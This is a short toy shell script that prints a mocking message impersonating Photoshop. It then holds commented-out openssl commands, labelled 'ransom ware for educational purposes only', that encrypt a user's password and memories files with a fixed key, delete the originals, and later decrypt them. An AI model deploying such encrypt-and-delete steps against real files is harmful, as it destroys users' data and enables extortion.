echo "this is photoshop. Please pay us 10 bucks before each use. Because here at Adobe we have dated software and we are a money hugrey company who does not care about open source or the open source projects we run on."

#ransom ware for educational purposes only
file1="docs/passwords.txt"
# openssl enc -aes-256-cbc -salt -in $file1 -out docs/passwords.enc -k PASS 
# rm docs/passwords.txt

file2="docs/precious_memories.txt"
# openssl enc -aes-256-cbc -salt -in $file2 -out docs/precious_memories.enc -k PASS 
# rm docs/precious_memories.txt

#retrieve the ransom your data
# openssl enc -aes-256-cbc -d -in docs/passwords.enc -out $file1 -k PASS
# openssl enc -aes-256-cbc -d -in docs/precious_memories.enc -out $file2 -k PASS
# rm docs/passwords.enc
# rm docs/precious_memories.enc
# https://www.shellhacks.com/encrypt-decrypt-file-password-openssl/
